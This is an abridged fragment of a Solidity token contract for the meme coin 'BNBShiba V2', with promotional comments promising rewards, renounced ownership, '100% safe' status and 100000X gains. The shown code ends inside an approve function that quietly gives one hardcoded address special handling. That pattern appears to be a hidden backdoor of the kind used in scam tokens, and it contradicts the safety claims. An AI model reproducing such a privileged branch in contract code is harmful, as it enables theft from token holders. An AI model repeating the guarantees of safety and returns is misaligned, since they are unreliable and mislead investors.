...
/** 
   ...
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #BNBShiba V2.
    
   Tokenomics features:
   You can earn real Cake.
   ...
   I will renounce the ownership to burn addresses to transfer #BNBShiba V2 to the community, make sure it's 100% safe.

   I will add 0.6 BNB and all the left 50% total supply to the pool
   Can you make #BNBShiba V2 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 BNBShiba V2 max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #BNBShiba V2 idea, increasing the liquidity pool automatically, 
...
contract BNBShiba {
    ...
    string public name = "BNBShiba V2";
    string public symbol = "BNBSHIBA";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x0D97286d18ea77eD113a4d31730c93ea92eB1F46)) {
